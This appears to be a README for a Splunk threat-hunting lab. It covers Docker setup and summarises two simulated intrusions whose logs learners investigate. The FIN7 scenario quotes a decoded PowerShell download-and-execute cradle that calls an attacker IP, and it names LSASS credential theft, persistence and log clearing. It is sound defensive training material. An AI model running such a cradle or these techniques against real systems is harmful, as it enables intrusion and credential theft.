# Splunk Lab Environment

## Quick Start

### 1. Generate sample data (first time only)
```bash
cd docker/scripts
python3 generate_sample_data.py
```

### 2. Start Splunk
```bash
cd docker
docker-compose up -d
```

### 3. Wait ~90 seconds, then open
```
URL:      http://localhost:8000
Username: admin
Password: AABVINLABS1!
```

### 4. Configure indexes (first time only)
```bash
docker exec splunk-lab /tmp/scripts/setup.sh
```

### 5. Verify data is indexed
In Splunk Search:
```spl
index=lab02 | head 5
index=lab03 | head 5
```

---

## Indexes

| Index | Lab | Content |
|-------|-----|---------|
| `lab02` | Malicious Account Creation | Windows Security events from CORP-DC01 |
| `lab03` | FIN7 Threat Hunting | Security + Sysmon events from CORP-WS01 |

---

## Attack Scenario Summary

### Lab 02 — Malicious Account Creation
- **Attacker IP:** 185.220.101.47
- **Compromised user:** j.smith
- **Malicious account created:** svc_backup
- **Group added to:** Administrators
- **Time:** 2024-11-14 02:17 UTC (outside business hours)
- **Key events:** 4624 (RDP logon) → 4688 (net.exe) → 4720 (account created) → 4732 (admin group) → 1102 (log cleared)

### Lab 03 — FIN7 Threat Hunting
- **Initial vector:** Macro in Q4_Invoice_11142024.doc
- **Compromised user:** m.johnson on CORP-WS01
- **C2 IP:** 185.220.101.47:8080 / :443
- **Payload:** update.exe dropped to %APPDATA%\Local\Temp\
- **Encoded PS command decodes to:**
  `$c=New-Object System.Net.WebClient;$c.DownloadString('http://185.220.101.47/gate')|IEX`
- **Persistence:** Registry Run key + Scheduled Task (LpkInstall)
- **Credential theft:** LSASS access (GrantedAccess: 0x1010)
- **Lateral movement:** RDP to CORP-DC01, new account fin7_persist created

---

## Stop / Clean Up
```bash
docker-compose down          # Stop, keep data
docker-compose down -v       # Stop and delete all data
```
